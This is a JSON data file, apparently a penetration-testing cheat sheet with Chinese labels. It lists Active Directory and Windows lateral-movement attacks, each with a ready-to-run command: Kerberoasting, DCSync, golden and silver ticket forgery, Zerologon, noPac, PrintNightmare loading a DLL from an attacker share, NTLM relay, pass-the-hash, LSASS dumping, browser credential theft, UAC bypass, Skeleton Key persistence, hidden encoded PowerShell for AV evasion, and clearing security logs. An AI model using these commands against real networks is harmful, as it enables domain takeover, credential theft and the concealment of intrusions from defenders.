[{"id":"ad-enum-domain","n":"域环境信息收集","cat":"域渗透","phase":"recon","d":"拉取域控、域管、信任与 GPO 清单。","cmds":["nxc ldap <dc> -u <user> -p <pass> --users --groups --gpp-passwords"],"tools":["nxc"],"tags":["ad"]},{"id":"ad-bloodhound","n":"BloodHound 攻击路径","cat":"域渗透","phase":"recon","d":"采集 ACL 与会话关系，定位到域管最短路径。","cmds":["bloodhound-python -d <domain> -u <user> -p <pass> -c all"],"tools":["bloodhound"],"tags":["ad","acl"]},{"id":"ad-kerberoast","n":"Kerberoasting","cat":"域渗透","phase":"exploit","d":"请求带 SPN 账号的 TGS 离线破解。","cmds":["impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc> -request"],"tools":["impacket"],"tags":["kerberos"]},{"id":"ad-asreproast","n":"AS-REP Roasting","cat":"域渗透","phase":"exploit","d":"对未开启预认证的账号离线破解。","cmds":["impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc> -request"],"tools":["impacket"],"tags":["kerberos"]},{"id":"ad-delegation","n":"委派攻击","cat":"域渗透","phase":"exploit","d":"利用非约束/约束/RBCD 委派模拟管理员。","cmds":["impacket-getST -spn cifs/<host> -impersonate administrator <domain>/<user>:<pass>"],"tools":["impacket"],"tags":["kerberos"]},{"id":"ad-acl-abuse","n":"ACL 权限滥用","cat":"域渗透","phase":"exploit","d":"用 GenericAll/WriteDACL 改密或提权。","cmds":["impacket-dacledit -action write -rights FullControl -principal <u> -target <t> <domain>/<a>:<p>"],"tools":["impacket"],"tags":["acl"]},{"id":"ad-dcsync","n":"DCSync 导出域哈希","cat":"域渗透","phase":"exploit","d":"复刻域控同步协议导出 krbtgt 哈希。","cmds":["impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc>"],"tools":["impacket"],"tags":["dcsync"]},{"id":"ad-golden-ticket","n":"黄金票据","cat":"域渗透","phase":"exploit","d":"用 krbtgt 哈希伪造任意用户 TGT。","cmds":["impacket-ticketer -nthash <krbtgt> -domain-sid <sid> -domain <domain> administrator"],"tools":["impacket"],"tags":["kerberos"]},{"id":"ad-silver-ticket","n":"白银票据","cat":"域渗透","phase":"exploit","d":"用服务账号哈希伪造针对单服务的 TGS。","cmds":["impacket-ticketer -nthash <svc> -spn cifs/<host> -domain-sid <sid> -domain <d> administrator"],"tools":["impacket"],"tags":["kerberos"]},{"id":"ad-nopac","n":"noPac 提权","cat":"域渗透","phase":"exploit","d":"利用 CVE-2021-42287/42278 短窗口拿下域控。","cmds":["noPac.py <domain>/<user>:<pass> -dc-ip <dc> -dc-host <dcname> --impersonate administrator -shell"],"tools":["nopac"],"tags":["cve"]},{"id":"ad-zerologon","n":"Zerologon","cat":"域渗透","phase":"exploit","d":"重置机器账号口令后 DCSync。","cmds":["python3 zerologon_tester.py <dcname> <dcip>"],"tools":["zerologon"],"tags":["cve"]},{"id":"ad-printnightmare","n":"PrintNightmare","cat":"域渗透","phase":"exploit","d":"加载恶意打印驱动获取 SYSTEM。","cmds":["python3 CVE-2021-1675.py <domain>/<u>:<p>@<ip> '\\\\<attacker>\\share\\x.dll'"],"tools":["printnightmare"],"tags":["cve"]},{"id":"ad-adcs-esc1","n":"ADCS ESC1 证书模板","cat":"域渗透","phase":"exploit","d":"申请可控 SAN 证书模拟域管。","cmds":["certipy req -u <u>@<d> -p <p> -ca <CA> -template <tpl> -upn administrator@<d>"],"tools":["certipy"],"tags":["adcs"]},{"id":"ad-adcs-esc8","n":"ADCS NTLM 中继","cat":"域渗透","phase":"exploit","d":"中继到 Web Enrollment 申请证书。","cmds":["ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs"],"tools":["impacket"],"tags":["adcs","relay"]},{"id":"ad-ntlm-relay","n":"NTLM 中继","cat":"域渗透","phase":"exploit","d":"用 Responder 关闭 SMB 后中继到其他主机。","cmds":["responder -I eth0 -rdwv","ntlmrelayx.py -tf targets.txt -smb2support"],"tools":["responder","impacket"],"tags":["relay"]},{"id":"ad-coerce","n":"强制认证触发","cat":"域渗透","phase":"exploit","d":"用打印机或 PetitPotam 让域控回连攻击者。","cmds":["python3 PetitPotam.py <attacker> <dc>"],"tools":["petitpotam"],"tags":["relay"]},{"id":"ad-smb-signing","n":"SMB 签名与中继面判断","cat":"域渗透","phase":"recon","d":"筛选未强制签名主机作为中继目标。","cmds":["nxc smb <cidr> --gen-relay-list relay.txt"],"tools":["nxc"],"tags":["smb"]},{"id":"ad-pth","n":"哈希传递","cat":"域渗透","phase":"exploit","d":"用 NTLM 哈希直接远程执行。","cmds":["nxc smb <ip> -u administrator -H <hash> -x whoami"],"tools":["nxc"],"tags":["pth"]},{"id":"ad-ptt","n":"票据传递","cat":"域渗透","phase":"exploit","d":"导入 ccache 后访问域内资源。","cmds":["export KRB5CCNAME=administrator.ccache; impacket-psexec -k -no-pass <host>"],"tools":["impacket"],"tags":["kerberos"]},{"id":"ad-gpp-pass","n":"GPP 密码解密","cat":"域渗透","phase":"exploit","d":"从 SYSVOL 读取 cpassword 并解密。","cmds":["nxc smb <dc> -u <u> -p <p> -M gpp_password"],"tools":["nxc"],"tags":["gpp"]},{"id":"ad-laps","n":"LAPS 密码读取","cat":"域渗透","phase":"exploit","d":"有读权限时直接取本地管理员密码。","cmds":["nxc ldap <dc> -u <u> -p <p> --laps"],"tools":["nxc"],"tags":["laps"]},{"id":"ad-exchange","n":"Exchange 邮件面攻击","cat":"域渗透","phase":"exploit","d":"ProxyLogon/ProxyShell 拿 SYSTEM 与邮箱。","cmds":["python3 proxyshell.py -u https://<host>"],"tools":["proxyshell"],"tags":["exchange"]},{"id":"ad-share-hunt","n":"共享与敏感文件检索","cat":"域渗透","phase":"exploit","d":"遍历共享搜配置、脚本与备份中的凭据。","cmds":["nxc smb <ip> -u <u> -p <p> --shares -M spider_plus"],"tools":["nxc"],"tags":["smb"]},{"id":"ad-session-hunt","n":"会话与本地管理员定位","cat":"域渗透","phase":"exploit","d":"找已登录域管的主机作为下一跳。","cmds":["nxc smb <cidr> -u <u> -p <p> --sessions --local-group"],"tools":["nxc"],"tags":["lateral"]},{"id":"ad-trust","n":"域信任攻击","cat":"域渗透","phase":"exploit","d":"用 SID History 跨域提权到父域。","cmds":["impacket-ticketer -nthash <krbtgt> -domain-sid <parent> -domain <parent> -extra-sid <child>-516 administrator"],"tools":["impacket"],"tags":["trust"]},{"id":"ad-persistence","n":"域内持久化","cat":"域渗透","phase":"exploit","d":"AdminSDHolder、Skeleton Key 与影子凭据。","cmds":["mimikatz 'misc::skeleton'","certipy shadow auto -u <u>@<d> -p <p> -account <target>"],"tools":["mimikatz","certipy"],"tags":["persist"]},{"id":"win-privesc-check","n":"Windows 提权面梳理","cat":"内网横向","phase":"exploit","d":"枚举服务权限、计划任务、补丁与 Token。","cmds":["winpeas.exe quiet","whoami /priv"],"tools":["winpeas"],"tags":["privesc"]},{"id":"win-suidenum","n":"SUID 服务与路径劫持","cat":"内网横向","phase":"exploit","d":"找可写的服务二进制目录替换执行。","cmds":["accesschk.exe -uwcqv * /accepteula"],"tools":["accesschk"],"tags":["privesc"]},{"id":"win-unquoted","n":"未加引号服务路径","cat":"内网横向","phase":"exploit","d":"在空格路径插入同名可执行文件提权。","cmds":["wmic service get name,pathname | findstr /i /v '\"'"],"tools":["wmic"],"tags":["privesc"]},{"id":"win-alwaysinstallelevated","n":"AlwaysInstallElevated","cat":"内网横向","phase":"exploit","d":"用 MSI 安装包以 SYSTEM 身份执行。","cmds":["reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"],"tools":["reg"],"tags":["privesc"]},{"id":"win-token-impersonate","n":"令牌窃取与模拟","cat":"内网横向","phase":"exploit","d":"用 Potato 系列从服务账号升到 SYSTEM。","cmds":["JuicyPotato.exe -l 1337 -p cmd.exe -a '/c whoami' -t *"],"tools":["juicypotato"],"tags":["privesc"]},{"id":"win-uac-bypass","n":"UAC 绕过","cat":"内网横向","phase":"exploit","d":"用 fodhelper/computerdefaults 提权到管理员。","cmds":["reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /f"],"tools":["reg"],"tags":["uac"]},{"id":"win-creds-files","n":"配置文件凭据搜集","cat":"内网横向","phase":"exploit","d":"搜 unattend.xml、web.config、RDP 历史中的口令。","cmds":["findstr /si password *.xml *.ini *.config"],"tools":["findstr"],"tags":["credential"]},{"id":"win-browser-creds","n":"浏览器凭据提取","cat":"内网横向","phase":"exploit","d":"解密 Chrome/Edge 保存的账号密码。","cmds":["SharpChrome.exe logins"],"tools":["sharpchrome"],"tags":["credential"]},{"id":"win-lsass-dump","n":"LSASS 内存导凭据","cat":"内网横向","phase":"exploit","d":"用 comsvcs 或 procdump 导出后离线解析。","cmds":["rundll32 comsvcs.dll MiniDump <pid> C:\\temp\\lsass.dmp full"],"tools":["mimikatz"],"tags":["credential"]},{"id":"win-dpapi","n":"DPAPI 解密","cat":"内网横向","phase":"exploit","d":"用域备份密钥解密用户与系统机密。","cmds":["mimikatz 'dpapi::masterkey /in:<file> /rpc'"],"tools":["mimikatz"],"tags":["credential"]},{"id":"win-scheduled-task","n":"计划任务权限利用","cat":"内网横向","phase":"exploit","d":"替换可写任务脚本或修改任务指向。","cmds":["schtasks /query /fo LIST /v"],"tools":["schtasks"],"tags":["persist"]},{"id":"win-wmi-persist","n":"WMI 事件订阅持久化","cat":"内网横向","phase":"exploit","d":"注册永久事件消费者实现无文件驻留。","cmds":["wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE"],"tools":["wmic"],"tags":["persist"]},{"id":"win-psexec","n":"远程执行落点","cat":"内网横向","phase":"exploit","d":"用 psexec/wmiexec 在目标落地会话。","cmds":["impacket-psexec <domain>/<u>:<p>@<ip>"],"tools":["impacket"],"tags":["lateral"]},{"id":"win-winrm","n":"WinRM 横向","cat":"内网横向","phase":"exploit","d":"5985/5986 开放时远程执行命令。","cmds":["evil-winrm -i <ip> -u <u> -p <p>"],"tools":["evil-winrm"],"tags":["lateral"]},{"id":"win-rdp-hijack","n":"RDP 会话劫持","cat":"内网横向","phase":"exploit","d":"管理员权限下接管已有远程会话。","cmds":["tscon <sessionid> /dest:rdp-tcp#0"],"tools":["tscon"],"tags":["rdp"]},{"id":"win-shadow-copy","n":"卷影副本提取","cat":"内网横向","phase":"exploit","d":"从快照复制 SAM/NTDS 获得离线哈希。","cmds":["vssadmin list shadows","copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit ."],"tools":["vssadmin"],"tags":["credential"]},{"id":"win-firewall-off","n":"防御面探测","cat":"内网横向","phase":"exploit","d":"确认防火墙、杀软与日志转发状态。","cmds":["netsh advfirewall show allprofiles","wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName"],"tools":["netsh"],"tags":["defense"]},{"id":"win-av-evasion","n":"载荷落地规避","cat":"内网横向","phase":"exploit","d":"用内存加载与白名单二进制降低检测。","cmds":["powershell -nop -w hidden -enc <base64>"],"tools":["powershell"],"tags":["evasion"]},{"id":"win-log-clear","n":"痕迹清理","cat":"内网横向","phase":"exploit","d":"清理安全日志与命令历史。","cmds":["wevtutil cl Security"],"tools":["wevtutil"],"tags":["cleanup"]},{"id":"win-adcs-relay","n":"域内横向收尾","cat":"内网横向","phase":"exploit","d":"混用哈希、票据与证书维持访问。","cmds":["nxc smb <cidr> -u <u> -H <hash> --sam"],"tools":["nxc"],"tags":["lateral"]}]